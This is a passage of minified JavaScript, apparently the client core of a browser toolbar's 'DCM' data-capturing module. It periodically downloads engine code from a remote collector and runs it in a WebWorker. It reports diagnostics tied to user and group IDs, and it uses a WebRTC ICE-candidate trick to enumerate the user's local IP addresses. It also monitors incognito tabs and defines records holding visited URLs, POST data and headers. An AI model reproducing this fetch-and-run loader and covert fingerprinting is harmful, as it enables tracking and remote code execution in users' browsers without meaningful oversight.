r[t]}}}function d(e){if(i.length==0){return}try{var t=e.loggerFactory.getLogger("DCMContext");t.error("Initialization errors:\n"+i.join("\n"))}catch(n){}i=[]}t.call(this);var n={};var r={};var i=[];this.addComponent=function(e,t,n){r[e]={name:e,loader:n,dependencies:t,progress:false}};this.create=function(e){n=e;var t={};for(var o in r){try{var u=s(o);f(u,t)}catch(a){i.push(a.toString())}}p(t);d(this)};this.destroy=function(){var e={};for(var t in r){try{var n=s(t);h(n,e)}catch(i){}}};this.cleanup=function(){for(var e in r){try{var t=s(e);t.loader.cleanup()}catch(n){}}};this.options=function(e){for(var t in r){try{var n=s(t);n.loader.options(e)}catch(i){}}};this.getName=function(){return e}}function r(){this.isPrivacyModeEnabled=function(e){throw"Method is not implemented"};this.openDialog=function(e,t){return false};this.openUrl=function(e){throw"Method is not implemented"}}function i(){r.call(this);S.call(this,{name:p.REMOTE_BROWSER_COMPONENT,quietMethods:["openUrl"],responseMethods:["isPrivacyModeEnabled","openDialog"]})}function s(e){t.call(this);this.create=function(t){e.communication={};e.communication.controller=new o(e);e.communication.factory=new a(e);e.communication.remote=new v(e)}}function o(){function t(t,n,i){if(e){var s=r(i);e.receive(t,n,s)}}function n(e){return JSON.parse(e)}function r(e){if(e===undefined||e===null){return JSON.stringify(null)}else if(e&&e.getJson){return e.getJson()}else{return JSON.stringify(e)}}u.call(this);d.call(this);var e;this.send=function(e,t,n){this.notifyReceivers(e,t,n)};this.transmit=function(e,n,r){t(e,n,r)};this.receive=function(e,t,r){var i=n(r);this.notifyReceivers(e,t,i)};this.setTransmitter=function(t){e=t}}function u(){this.send=function(e,t,n){};this.receive=function(e,t,n){};this.transmit=function(e,t,n){};this.setTransmitter=function(e){};this.addReceiver=function(e,t){};this.removeReceiver=function(e,t){}}function a(e){this.createReciever=function(t,n){return new c(e,t,n)};this.extendReciever=function(t,n,r){c.call(t,e,n,r)};this.createSender=function(){return new h(e)};this.extendSender=function(t){h.call(t,e)}}function f(e,t){c.call(this,e,t);this.onMessage=function(t,n){alert("subject: "+e+"\ntopic:  "+t+"\ndata:   "+n)}}function l(){this.getJson=function(){return{}}}function c(e,t,n){function s(e,t){if(i.test(e)){r.onMessage(e,t)}}var r=this;var i=new RegExp(n?n:p.ANY_TOPIC);e.communication.controller.addReceiver(t,s);this.unregister=function(){e.communication.controller.removeReceiver(t,s)};this.onMessage=function(e,t){}}function h(e){function t(e,t){if(!e||!t){throw"Incorrect message parameters"}}this.send=function(n,r,i){t(n,r);e.communication.controller.send(n,r,i)};this.transmit=function(n,r,i){t(n,r);e.communication.controller.transmit(n,r,i)}}function d(){function t(t){if(!e[t]){e[t]=[]}return e[t]}var e={};this.addReceiver=function(e,n){var r=t(e);r.push(n)};this.removeReceiver=function(e,n){var r=t(e);var i=r.indexOf(n);if(i>-1){r.splice(i,1)}};this.notifyReceivers=function(e,n,r){var i=t(e);for(var s=0;s<i.length;s++){try{i[s](n,r)}catch(o){}}}}function v(e){var t=new w(e);this.registerRemoteTarget=function(e,n){t.registerRemoteObject(e,n)};this.createRemoteFunctionTarget=function(t,n){return new b(e,t,n)};this.createRemoteFunctionSource=function(t){return new y(e,t)};this.createQuietRemoteFunctionTarget=function(t,n){return new g(e,t,n)};this.createQuietRemoteFunctionSource=function(t){return new m(e,t)};this.extendRemoteObjectSource=function(t,n){E.call(t,e,n)};this.extendRemoteObjectTarget=function(t,n){n=n?n:t;x.call(t,e,n)}}function m(e,t){y.call(this,e,t);var n=this.callRemote;this.callRemote=function(e){var t=this.convertArguments(arguments,0);t.unshift(function(){});n.apply(this,t)}}function g(e,t,n){function i(e){var t=r.convertArguments(arguments,1);n.apply(n,t);e(true)}b.call(this,e,t,i);var r=this}function y(e,t){function o(){r++;return n+"."+r}T.call(this);e.communication.factory.extendReciever(this,t+"-response");var n=this.generateId();var r=0;var i={};var s=e.communication.factory.createSender();this.callRemote=function(e,n){var r=this.convertArguments(arguments,1);var u=o();i[u]=e;s.transmit(t+"-call",u,r)};this.onMessage=function(t,n){n=n.slice();var r=i[t];r.apply(r,n);delete i[t]}}function b(e,t,n){function s(e){return function(){var n=r.convertArguments(arguments,0);i.transmit(t+"-response",e,n)}}T.call(this);var r=this;var i=e.communication.factory.createSender();e.communication.factory.extendReciever(this,t+"-call");this.onMessage=function(e,t){t=t.slice();t.unshift(s(e));n.apply(n,t)}}function w(e){function i(e,t){function n(){return e.apply(this,t)}n.prototype=e.prototype;return new n}function s(s){t.debug("Constructing remote target: "+s.interfaceName);var o=r[s.interfaceName];if(o){try{var u=s.constructorArguments;u.unshift(e);var a=i(o,u);var f=s.instancesId;a.initRemoteTarget(f);n[f]=a;t.debug("Remote target constructed.")}catch(l){t.error("Cannot construct remote target: "+l)}}else{t.debug("Remote target is not registered.")}}function o(e){var r=n[e];if(r){t.debug("Destroying remote target: "+e);delete n[e];r.destroy()}else{t.debug("Cannot destroy remote target. Instance not found: "+e)}}e.communication.factory.extendReciever(this,p.REMOTE_OBJECT_SUBJECT);var t=e.loggerFactory.getLogger("communication.RemoteObjectsFactory");var n={};var r={};this.onMessage=function(e,t){if(e==p.REMOTE_OBJECT_CREATE_TOPIC){s(t)}else if(e==p.REMOTE_OBJECT_DESROY_TOPIC){o(t)}};this.registerRemoteObject=function(e,n){var i=new e;t.info("Registering remote target: "+i.getRemoteName());r[i.getRemoteName()]=n}}function E(e,t){function s(){var e=n.convertArguments(t,0);i.transmit(p.REMOTE_OBJECT_SUBJECT,p.REMOTE_OBJECT_CREATE_TOPIC,{interfaceName:n.getRemoteName(),instancesId:n.getInstanceId(),constructorArguments:e})}function o(t,i){for(var s=0;s<t.length;s++){var o=t[s];var a=n.constructMethodId(o);var f=e.communication.remote[i](a);r.push(f);u(o,f)}}function u(e,t){n[e]=function(){var e=n.convertArguments(arguments,0);t.callRemote.apply(t,e)}}var n=this;var r=[];var i=e.communication.factory.createSender();o(this.getResponseMethods(),"createRemoteFunctionSource");o(this.getQuietMethods(),"createQuietRemoteFunctionSource");s();this.destroy=function(){i.transmit(p.REMOTE_OBJECT_SUBJECT,p.REMOTE_OBJECT_DESROY_TOPIC,n.getInstanceId());for(var e=0;e<r.length;e++){r[e].unregister()}}}function S(e){T.call(this);var t=e.name+"-"+this.generateId();this.getRemoteName=function(){return e.name};this.getInstanceId=function(){return t};this.setInstanceId=function(e){t=e};this.getQuietMethods=function(){return e.quietMethods};this.getResponseMethods=function(){return e.responseMethods};this.constructMethodId=function(e){return t+"-"+e}}function x(e,t){function i(t,i){for(var o=0;o<t.length;o++){var u=t[o];var a=n.constructMethodId(u);var f=e.communication.remote[i](a,s(u));r.push(f)}}function s(e){return function(){var r=n.convertArguments(arguments,0);t[e].apply(n,r)}}var n=this;var r=[];this.initRemoteTarget=function(e){this.setInstanceId(e);i(this.getResponseMethods(),"createRemoteFunctionTarget");i(this.getQuietMethods(),"createQuietRemoteFunctionTarget")};this.destroy=function(){for(var e=0;e<r.length;e++){r[e].unregister()}}}function T(){this.convertArguments=function(e,t){return Array.prototype.splice.call(e,t)};this.generateId=function(){return Date.now()+"-"+Math.floor(Math.random()*1e4)}}function N(e){function r(e){var r=e.data;t.notifyReceivers(r.subject,r.topic,r.data);n.receive(r.subject,r.topic,r.data)}function i(e){var r='"'+e.message+". At line: "+e.lineno+'"';t.notifyReceivers(p.ENGINE_WORKER_SUBJECT,p.WORKER_ERROR_TOPIC,r);n.receive(p.ENGINE_WORKER_SUBJECT,p.WORKER_ERROR_TOPIC,r)}u.call(this);d.call(this);var t=this;var n;this.start=function(){e.onmessage=r;e.onerror=i};this.stop=function(){e.onmessage=function(){};e.onerror=function(){}};this.receive=function(t,n,r){this.notifyReceivers(t,n,r);e.postMessage({subject:t,topic:n,data:r})};this.setTransmitter=function(e){n=e}}function C(){this.getLogger=function(e){return new k};this.clear=function(){}}function k(){this.debug=function(e){};this.info=function(e){};this.warn=function(e){};this.error=function(e){}}function L(e){var t=e instanceof Object?e:{};if(!t.timestamp){t.timestamp=Date.now()}this.setUrl=function(e){t.url=e};this.getUrl=function(){return t.url};this.setTabId=function(e){t.tabId=e};this.getTabId=function(){return t.tabId};this.setMethod=function(e){t.method=e};this.getMethod=function(){return t.method};this.getTimestamp=function(){return t.timestamp};this.setTimestamp=function(e){t.timestamp=e};this.setRequestType=function(e){t.requestType=e};this.getRequestType=function(){return t.requestType};this.setPostData=function(e){t.postData=e};this.getPostData=function(){return t.postData};this.setStatusCode=function(e){t.status=e};this.getStatusCode=function(){return t.status};this.setFrameId=function(e){t.frameId=e};this.getFrameId=function(){return t.frameId};this.setOpenerTabId=function(e){t.openerTabId=e};this.getOpenerTabId=function(){return t.openerTabId};this.setRequestHeaders=function(e){t.requestHeaders=e};this.getRequestHeaders=function(){return t.requestHeaders};this.setResponseHeaders=function(e){t.responseHeaders=e};this.getResponseHeaders=function(){return t.responseHeaders};this.getData=function(){return t}}function O(){_.call(this);S.call(this,{name:p.REMOTE_SETTINGS_STORAGE,quietMethods:["set","remove","removeAll"],responseMethods:[]})}function M(){P.call(this);S.call(this,{name:p.REMOTE_DISK_STORAGE,quietMethods:[],responseMethods:["read","write","exist","remove"]})}function _(){this.set=function(e,t){};this.get=function(e){};this.has=function(e){};this.remove=function(e){};this.removeAll=function(){};this.getAll=function(){}}function D(e){this.getStorage=function(e){};this.getSettings=function(){}}function P(){this.read=function(e){};this.write=function(e,t){};this.append=function(e,t){};this.exist=function(e){};this.remove=function(e){};this.destroy=function(){}}function H(){this.send=function(e,t){};this.setRequestHeader=function(e,t){};this.disableCaching=function(){}}function B(){this.createGet=function(e,t){return new H};this.createPost=function(e,t){return new H};this.createResponse=function(e,t){return new j({code:e,text:t})}}function j(e){this.isSuccessful=function(){return this.isOkResponse()||this.isNotModifiedResponse()};this.getText=function(){return this.isOkResponse()?e.text:null};this.isOkResponse=function(){return e.code==200};this.isNotModifiedResponse=function(){return e.code==304};this.getJson=function(){return e};this.getCode=function(){return e.code}}function F(e){function r(t){var n=t?p.DCM_ENABLED:p.DCM_DISABLED;var r=e.communication.factory.createSender();r.send(p.CLIENT_SYNC_DIAGNOSTIC_SUBJECT,n);var i=e.storageFactory.getSettings();i.set("disabled",!t)}t.call(this);var n=false;this.create=function(t){var n=e.storageFactory.getSettings();if(n.get("disabled")){r(true)}};this.destroy=function(){if(n){r(false)}};this.options=function(e){if(e&&e.addonDisabled!==undefined){n=e.addonDisabled}}}function I(e){var t=false;var n=false;var r={};this.start=function(){if(t){throw"DCM cannot be started twice"}e.create(r);t=true};this.stop=function(){if(!t){throw"DCM cannot be stopped. It wasn't started"}if(n){e.cleanup()}e.destroy();t=false};this.uninstall=function(){if(!t){throw"DCM cannot be uninstalled. It wasn't started"}n=true};this.cancelUninstall=function(){if(!t){throw"DCM cannot be uninstalled. It wasn't started"}if(!n){throw"Cannot cancel uninstall since it hasn't been called."}n=false};this.configure=function(e){if(t){throw"DCM cannot be configured. It was already started"}r=e};this.permitDataCapturing=function(n){if(!t){throw"DCM cannot accept Opt-In setting before it was started"}e.options({dataCapturingDisabled:!n})};this.requestUserOptIn=function(n){if(!t){throw"DCM cannot show user Opt-In dialog before start"}e.options({optInDialog:n})};this.onDisable=function(n){if(!t){throw"DCM cannot be notified about enable/disable before start"}e.options({addonDisabled:n})};this.setHostVersion=function(n){if(!t){throw"DCM cannot be notified about host version before start"}e.options({hostVersion:n})}}function q(e){t.call(this);var n;var r;this.create=function(t){n=new R(e,p.CLIENT_DIAGNOSTIC_SUBJECT,true);r=new R(e,p.CLIENT_SYNC_DIAGNOSTIC_SUBJECT,false);e.diagnostic={};e.diagnostic.onReady=function(){n.onReady();r.onReady()}};this.destroy=function(){if(n){n.unregister()}if(r){r.unregister()}}}function R(e,t,n){function o(){var e=parseInt(r.get(A.EPOCH_OFFSET));return isNaN(e)?0:e}function u(e,t){return JSON.stringify({event:e,timestamp:Date.now()-o(),message:t?t:""})}function a(t){var r=e.requestFactory.createPost("https://collector.dataferb.com/diagnostic",function(){});r.send(t,n)}e.communication.factory.extendReciever(this,t);var r=e.storageFactory.getSettings();var i=[];var s=false;this.onReady=function(){s=true;i.forEach(function(e){a(e)});i=[]};this.onMessage=function(e,t){if(!s){i.push(u(e,t))}else{a(u(e,t))}}}function U(e){function s(){var t=e.storageFactory.getStorage("dcm-engine");t.remove(function(){});n.remove("dcm-engine.last-download-time")}function o(e){r.info("Performing client install procedures. Version: "+e);n.set(A.CLIENT_VERSION,e);i.send(p.CLIENT_DIAGNOSTIC_SUBJECT,p.CLIENT_INSTALLED)}function u(e,t){r.info("Performing client update from '"+e+"' to '"+t+"'");n.set(A.CLIENT_VERSION,t);i.send(p.CLIENT_DIAGNOSTIC_SUBJECT,p.CLIENT_UPDATED,"DCM Client has been updated from '"+e+"'.")}function a(e,t){var n="";e.split(".").forEach(function(e){var r="";var i=t-e.length;if(i>0){r=(new Array(i+1)).join("0")}n+=r+e+"."});if(n.length>0){return n.substring(0,n.length-1)}else{return e}}function f(e,t){var n=4;return a(e,n)<a(t,n)}t.call(this);var n;var r;var i;this.create=function(t){try{n=e.storageFactory.getSettings();r=e.loggerFactory.getLogger("lifecycle.ClientInstallComponent");i=e.communication.factory.createSender();var s=t.clientVersion;if(n.has(A.CLIENT_VERSION)){var a=n.get(A.CLIENT_VERSION);if(f(a,s)){t.removeCachedEngine=true;u(a,s)}}else{o(s)}}catch(l){r.error("Error during install procedures: "+l)}}}function z(e){t.call(this);this.create=function(t){var n=e.storageFactory.getSettings();t.settingsDump=n.getAll()}}function W(){t.call(this);this.create=function(e){e.clientVersion="1.1.129"}}function X(e){function r(e){n.send(p.CLIENT_DIAGNOSTIC_SUBJECT,p.HOST_VERSION_UPDATED,e)}function i(e){t.set(nt.HOST_VERSION,e)}var t=e.storageFactory.getSettings();var n=e.communication.factory.createSender();this.update=function(e){if(t.has(nt.HOST_VERSION)){var n=t.get(nt.HOST_VERSION);if(n!=e){var s="The version of host toolbar has been updated from '"+n+"' to '"+e+"'.";i(e);r(s)}}else{i(e);r("The version of host toolbar has been set to '"+e+"'.")}}}function V(e){function i(t){var n=function(){var n=function(t){e.options({dataCapturingDisabled:!t})};e.browser.component.openDialog(t,n)};setTimeout(n,50)}t.call(this);var n;var r;this.create=function(t){n=new $(e,t);r=new X(e)};this.options=function(e){if(e){if(e.optInDialog){i(e.optInDialog)}else if(e.dataCapturingDisabled||e.dataCapturingDisabled===false){n.update(e.dataCapturingDisabled)}else if(e.hostVersion){r.update(e.hostVersion)}}}}function $(e,t){function i(e){return e!==undefined&&e!==null}function s(e,t){if(i(t)){n.set(e,t);return true}return false}function o(e,t){if(!n.has(e)){return s(e,t)}return false}function u(e,t,n){var r=undefined;if(e){r=e[t]}if(!i(r)){r=n}return r}function a(e,t){var r=e;var o=n.get("uninstalled-"+A.GROUP_ID);var u=n.get("uninstalled-"+A.USER_ID);var a=false;if(i(o)&&i(u)&&o==t){r=u;a=true}s(A.USER_ID,r);if(a){h(e)}n.remove("uninstalled-"+A.GROUP_ID);n.remove("uninstalled-"+A.USER_ID)}function f(e){var t=n.has(A.USER_ID);var r=n.has(A.GROUP_ID);if(!t||!r){var i=Date.now();var o=u(e,"groupId","unreg_group");if(!r){s(A.GROUP_ID,o)}if(!t){var f=u(e,"userId","unreg_user_"+i);a(f,o)}}}function l(e){f(e);if(o(A.DATA_DISABLED_KEY,true)){c(true)}}function c(e){var t=e?p.USER_OPTED_OUT:p.USER_OPTED_IN;r.send(p.CLIENT_DIAGNOSTIC_SUBJECT,t)}function h(e){r.send(p.CLIENT_DIAGNOSTIC_SUBJECT,p.USER_ID_RESTORED,"DCM restored old user-id instead of using new '"+e+"'")}var n=e.storageFactory.getSettings();var r=e.communication.factory.createSender();l(t);this.update=function(e){if(e!==null&&e!==undefined){if(s(A.DATA_DISABLED_KEY,e)){c(e)}}};this.getUserGroupId=function(){return{userId:n.get(A.USER_ID),groupId:n.get(A.GROUP_ID)}};this.preserveUserGroupId=function(e){s("uninstalled-"+A.USER_ID,u(e,"userId"));s("uninstalled-"+A.GROUP_ID,u(e,"groupId"))}}function J(e,t){function u(){s.send(p.ENGINE_WORKER_SUBJECT,p.WORKER_CODE_EXIST_TOPIC,n)}function a(e){if(e){r.info("Code exists. Notifying others");o.start();u()}else{r.info("Code doesn't exists. Forcing download.");h(true)}}function f(e){r.info("New code exist. Writing to cache.");i.write(function(){u()},e.getText());r.info("New code was successfully downloaded.");s.send(p.CLIENT_DIAGNOSTIC_SUBJECT,p.ENGINE_DOWNLOAD_SUCCEEDED)}function l(e){var t="Cannot download code. Response: "+e.getCode();r.info(t);s.send(p.CLIENT_DIAGNOSTIC_SUBJECT,p.ENGINE_DOWNLOAD_FAILED,t)}function c(e){o.update();r.info("Engine code download response arrived.");if(e.isOkResponse()){f(e)}else if(e.isNotModifiedResponse()){r.info("Code is not modified. Using old code")}else{l(e)}}function h(t){r.info("Time to download new engine code. Performing request.");var n=e.requestFactory.createGet("https://collector.dataferb.com/code",c);if(t){n.disableCaching()}n.send(null)}e.communication.factory.extendReciever(this,p.ENGINE_WORKER_SUBJECT,p.ENGINE_FAILURE);var n="dcm-engine";var r=e.loggerFactory.getLogger("client.runner.EngineCodeCaching");var i=e.storageFactory.getStorage(n);var s=e.communication.factory.createSender();var o=new Q(e,{name:n,interval:24*60*60*1e3});this.start=function(){r.info("Ready to download the code.");if(t.removeCachedEngine==true){t.removeCachedEngine=undefined;i.remove(function(){o.setCallback(h);i.exist(a)})}else{o.setCallback(h);i.exist(a)}};this.stop=function(){this.unregister();o.stop()};this.onMessage=function(e,t){r.info("Since we downloaded bad engine we are going to remove it.");i.remove(function(){})}}function K(e){t.call(this);var n;this.create=function(t){n=new J(e,t);n.start()};this.destroy=function(){n.stop()}}function Q(e,t){function u(){var e=o.get(i);try{return parseInt(e,10)}catch(t){return 0}}function a(){var e=Date.now().toString();return o.set(i,e)}function f(){var e=u();if(e>0){var t=Math.abs(Date.now()-e);if(t<s){return s-t}}return 0}function l(e){c();r=setTimeout(n,e)}function c(){if(r){clearTimeout(r)}}var n;var r;var i=t.name+".last-download-time";var s=t.interval;var o=e.storageFactory.getSettings();this.setCallback=function(e){n=e};this.start=function(){l(f())};this.stop=function(){n=null;c()};this.update=function(){a();l(s)}}function G(e,t){function f(){o.info("Attaching communicator.");i=new N(e.lifecycle.engineWorker);i.setTransmitter(e.communication.controller);e.communication.controller.setTransmitter(i)}function l(n){o.info("Engine code retrieved. Creating WebWorker.");e.lifecycle.engineWorker=t.build(n);o.info("Worker Object ready");s=setTimeout(g,10*1e3);f();h();d();a=true}function c(e){try{if(!e){o.info("Cannot init worker. Code empty.");u.send(p.ENGINE_WORKER_SUBJECT,p.WORKER_ERROR_TOPIC,"Cannot init worker. Code empty.")}else if(!a){l(e)}else{o.info("Newer code downloaded. Replacing cached version.");m();l(e)}}catch(t){o.error("Cannot create worker. Engine not started: "+t)}}function h(){o.info("Starting engine.");i.start();u.transmit(p.ENGINE_WORKER_SUBJECT,p.ENGINE_CREATE_TOPIC,n)}function d(){if(r&&i){o.info("Sending options.");u.transmit(p.ENGINE_WORKER_SUBJECT,p.ENGINE_OPTIONS_TOPIC,r)}}function v(){o.info("Cleanup engine.");u.transmit(p.ENGINE_WORKER_SUBJECT,p.ENGINE_CLEANUP_TOPIC,null)}function m(){o.info("Stopping engine.");u.transmit(p.ENGINE_WORKER_SUBJECT,p.ENGINE_DESTROY_TOPIC,null);if(i){i.stop()}o.info("Terminating WebWorker.");e.lifecycle.engineWorker.terminate();a=false}function g(){m();o.info("Engine wasn't created. Reporting diagnostic message.");u.send(p.CLIENT_DIAGNOSTIC_SUBJECT,p.ENGINE_FAILURE);u.send(p.ENGINE_WORKER_SUBJECT,p.ENGINE_FAILURE)}e.communication.factory.extendReciever(this,p.ENGINE_WORKER_SUBJECT);var n;var r;var i;var s;var o=e.loggerFactory.getLogger("client.engine.EngineRunner");var u=e.communication.factory.createSender();var a=false;this.onMessage=function(t,n){switch(t){case p.ENGINE_CREATED_TOPIC:o.info("Engine created successfully.");if(s){clearTimeout(s)}break;case p.WORKER_CODE_EXIST_TOPIC:var r=e.storageFactory.getStorage(n);r.read(c);break}};this.create=function(e){n=e;o.info("Ready to init engine. Remember config")};this.options=function(e){r=e;d()};this.cleanup=function(){v()};this.destroy=function(){m();o.info("Shutting down.");this.unregister()}}function Y(e,n){t.call(this);var r;this.create=function(t){r=new G(e,n);r.create(t)};this.options=function(e){r.options(e)};this.destroy=function(){r.destroy()};this.cleanup=function(){r.cleanup()}}function Z(e){e.communication.factory.extendReciever(this,p.ENGINE_WORKER_SUBJECT,p.WORKER_ERROR_TOPIC);var t=e.loggerFactory.getLogger("client.runner.RunnerErrorsListener");this.onMessage=function(e,n){t.error(n)}}function et(e){t.call(this);var n;this.create=function(){n=new Z(e);var t=e.loggerFactory.getLogger("client.runner.RunnerErrorsListenerComponent");t.info("Engine Error listener initialized")}}function tt(){this.build=function(e){}}function rt(e){this.createNetworkUtils=function(){throw"Method is not implemented"}}function it(t){function s(e){e.split("\r\n").forEach(function(e){if(~e.indexOf("a=candidate")){var t=e.split(" ");var n=t[4];var r=t[7];if(r==="host"){o(n)}}else if(~e.indexOf("c=")){var t=e.split(" ");var n=t[2];o(n)}})}function o(e){if(e in r){return}else{r[e]=true}if(i){i(e)}}st.call(this);var n=t.loggerFactory.getLogger("client.system.NetworkUtils");var r={"0.0.0.0":false};var i=null;this.enumLocalIP=function(t){i=t;var r=e.webkitRTCPeerConnection||e.mozRTCPeerConnection;var o=new r({iceServers:[]});if(e.mozRTCPeerConnection){o.createDataChannel("",{reliable:false})}o.onicecandidate=function(e){if(e.candidate){s(e.candidate.candidate)}};o.createOffer(function(e){s(e.sdp);o.setLocalDescription(e)},function(e){n.warn("offer failed: "+e)})}}function st(){this.enumLocalIP=function(e){throw"Method is not implemented."}}function ot(e,t){function i(){var e=t.createNetworkUtils();e.enumLocalIP(function(e){n.transmit(p.SYSTEM_INFO_SUBJECT,p.LOCAL_IP_ADDRESS_DETECTED_TOPIC,e)})}e.communication.factory.extendReciever(this,p.ENGINE_WORKER_SUBJECT);var n=e.communication.factory.createSender();var r=e.loggerFactory.getLogger("client.system.SystemComponent");this.onMessage=function(e,t){switch(e){case p.ENGINE_CREATED_TOPIC:i();break}}}function ut(e){t.call(this);var n;this.create=function(){n=e.communication.factory.createSender()};this.cleanup=function(){n.send(p.CLIENT_SYNC_DIAGNOSTIC_SUBJECT,p.CLIENT_UNINSTALLED)}}function at(e){t.call(this);var n;var r;this.create=function(t){r=new pt(e);n=new ft(e);e.communication.remote.registerRemoteTarget(i,lt);e.communication.remote.registerRemoteTarget(M,ct);e.communication.remote.registerRemoteTarget(O,ht)};this.destroy=function(){r.stop();r=null;n.stop();n=null}}function ft(e){function n(e){var t=e.split(":");if(!t[1]||t[1].match("^(debug|info|warn|error)$")==null){t[1]="info"}return[t[0],t[1]]}function r(n){if(!t[n]){t[n]=e.loggerFactory.getLogger("engine."+n)}return t[n]}e.communication.factory.extendReciever(this,p.APPLICATION_LOG_SUBJECT);var t={};this.onMessage=function(e,t){try{var i=n(e);var s=r(i[0]);s[i[1]](t)}catch(o){}};this.stop=function(){t=null;this.unregister()}}function lt(e){i.call(this);e.communication.remote.extendRemoteObjectTarget(this,e.browser.component)}function ct(e,t){M.call(this);e.communication.remote.extendRemoteObjectTarget(this);var n=e.storageFactory.getStorage(t);this.read=function(e){n.read(e)};this.write=function(e,t){n.write(e,t)};this.exist=function(e){n.exist(e)};this.remove=function(e){n.remove(e)}}function ht(e){O.call(this);e.communication.remote.extendRemoteObjectTarget(this);var t=e.storageFactory.getSettings();this.set=function(e,n){t.set(e,n)};this.remove=function(e){t.remove(e)};this.removeAll=function(){t.removeAll()}}function pt(e){function n(e){return function(t){e(t.getJson())}}function r(t,r){var i=n(t);if(r.method=="POST"){return e.requestFactory.createPost(r.url,i)}else{return e.requestFactory.createGet(r.url,i)}}function i(e,t){for(var n in t.headers){e.setRequestHeader(n,t.headers[n])}}function s(e,t){var n=r(e,t);i(n,t);n.send(t.data)}var t=e.communication.remote.createRemoteFunctionTarget(p.XHR_REMOTE_FUNCTION_SUBJECT,s);this.stop=function(){t.unregister()}}function dt(e,n){t.call(this);this.create=function(){e.requestFactory=new yt(e,n)}}function vt(){this.configure=function(e){}}function mt(e,t){function i(e){var t="0";if(r.has(e)){t=r.get(e)}return t}H.call(this);var n=t;var r=e.storageFactory.getSettings();this.send=function(e,t){n.setRequestHeader("X-Client-Version","1.1.129");n.setRequestHeader("X-Engine-Version",i(A.ENGINE_VERSION));n.setRequestHeader("X-User-Id",i(A.USER_ID));n.setRequestHeader("X-Group-Id",i(A.GROUP_ID));n.send(e,t)};this.setRequestHeader=function(e,t){n.setRequestHeader(e,t)};this.disableCaching=function(){n.disableCaching()}}function gt(e,t,n,r,i){function u(e){var t="?";for(var n in e){t+=n+"="+e[n]+"&"}return t.substring(0,t.length-1)}function a(e){if(i=="POST"){return e}else{return null}}function f(e){if(i=="GET"){return n+u(e)}else{return n}}function l(){if(this.readyState===4){r(e.requestFactory.createResponse(this.status,this.responseText))}}H.call(this);var s={};var o=new XMLHttpRequest;this.send=function(e,n){try{var r=f(e);var u=a(e);t.configure(o);o.onreadystatechange=l;o.open(i,r,n==undefined?true:n);for(var c in s){o.setRequestHeader(c,s[c])}if(i=="POST"){o.setRequestHeader("Content-Type","text/plain")}o.send(u)}catch(h){}};this.setRequestHeader=function(e,t){s[e]=t};this.disableCaching=function(){this.setRequestHeader("pragma","no-cache");this.setRequestHeader("Cache-Control","no-cache");this.setRequestHeader("If-Modified-Since","Sat, 1 Jan 2000 00:00:00 GMT")}}function yt(e,t){function n(){}function r(e){if(e){return e}else{return n}}function i(n,i,s){var o=new gt(e,t,n,r(i),s);return new mt(e,o)}B.call(this);this.createGet=function(e,t){return i(e,t,"GET")};this.createPost=function(e,t){return i(e,t,"POST")}}function wt(e){function o(){if(!s&&t&&n&&i){s=true;var e=new St(n);e.open(i,t)}}r.call(this);e.communication.factory.extendReciever(this,p.OPT_IN_DIALOG_SUBJECT);var t=null;var n=null;var i=null;var s=false;this.isPrivacyModeEnabled=function(t){e.browser.privacyListener.isPrivacyEnabled(t)};this.openDialog=function(e,t){n=e;i=t;o()};this.openUrl=function(e){if(e&&e!=""){chrome.tabs.create({url:e})}};this.onMessage=function(e,n){if(e==p.OPT_IN_DIALOG_CONFIG_AVAILABLE){t=n;o()}else if(e==p.OPT_IN_DIALOG_CONFIG_REMOVED){t=null}}}function Et(e){t.call(this);this.create=function(t){e.browser={};e.browser.component=new wt(e);e.browser.privacyListener=new xt(e,chrome.tabs);e.browser.privacyListener.start()};this.destroy=function(){e.browser.privacyListener.stop()}}function St(t){function r(t,n,r){var i=screen.width/2-n/2;var s=screen.height/2-r/2;var o=e.open("","_blank","toolbar=no, location=no, directories=no, status=no, menubar=no, "+"scrollbars=no, resizable=no, copyhistory=no, width="+n+", height="+r+", top="+s+", left="+i);var u=o.document;u.open("text/html","replace");u.write(t);u.close()}var n="<html>"+"    <title>"+t.title+"</title>"+'    <style type="text/css">'+"    #base {"+"        height: 100%;"+"        }"+"    #base #content {"+"        min-height: 100%;"+"        position: relative;"+"        width: 100%;"+"        }"+"    #base #footer {"+"        height: 30px;"+"        width: 100%;"+"        bottom: 0;"+"        position: fixed;"+"        text-align: center;"+"        margin-bottom: 10px;"+"        }"+"    </style>"+"    <body>"+'        <div id="base">'+'            <iframe id="content" scrolling="no" frameborder="0"'+'            src="'+t.url+'"></iframe>'+'            <div id="footer">'+'                <input type="button" value="'+t.accept+'" style="width: 100px; height: 100%"'+'                onclick="window.opener.returnCallback(true); window.opener.returnCallback = undefined; window.close();"/>'+'                <input type="button" value="'+t.reject+'" style="width: 100px; height: 100%"'+'                onclick="window.opener.returnCallback(false); window.opener.returnCallback = undefined; window.close();"/>'+"            </div>"+"        </div>"+"    </body>"+"</html>";this.open=function(t,i){e.returnCallback=function(e){t(e);if(e==true){var n=bt.storageFactory.getSettings();n.set(A.CONFIRMATION_PAGE_SHOWN,true);bt.browser.component.openUrl(i.acceptPageUrl)}else{bt.browser.component.openUrl(i.cancelPageUrl)}};r(n,410,400)}}function xt(e,t){function i(e){r.info("Tab ["+e.id+"] was created.");if(e.incognito){n.transmit(p.PRIVACY_MODE_SUBJECT,p.PRIVACY_MODE_ENABLED,e.id)}}function s(e){r.info("Tab ["+e+"] was removed.");n.transmit(p.PRIVACY_MODE_SUBJECT,p.PRIVACY_MODE_DISABLED,e)}var n=e.communication.factory.createSender();var r=e.loggerFactory.getLogger("client.browser.PrivacyMonitor");this.isPrivacyEnabled=function(e){t.query({},function(t){var n=[];t.forEach(function(e){if(e.incognito){n.push(e.id)}});e(false,n)})};this.start=function(){t.onCreated.addListener(i);t.onRemoved.addListener(s)};this.stop=function(){t.onRemoved.removeListener(s);t.onCreated.removeListener(i)}}function Tt(e){t.call(this);this.create=function(t){e.lifecycle={};e.diagnostic.onReady()}}function Nt(){kt.call(this);this.append=function(e,t){switch(t){case Mt.DEBUG:console.log(e);break;case Mt.INFO:console.info(e);break;case Mt.WARN:console.warn(e);break;case Mt.ERROR:console.error(e);break}}}function Ct(e){function r(){if(t){e.append(function(){},t);t=""}else{clearInterval(n);n=null}}kt.call(this);var t="";var n=null;this.append=function(e,i){t=t.concat(e+"\r\n");if(!n){n=setInterval(r,500)}}}function kt(){this.append=function(e,t){}}function Lt(e,t,n){function r(e){var t=String(e);if(t.length===1){t="0"+t}return t}function i(){var e=new Date;return e.getFullYear()+"-"+r(e.getMonth()+1)+"-"+r(e.getDate())+" "+r(e.getHours())+":"+r(e.getMinutes())+":"+r(e.getSeconds())}function 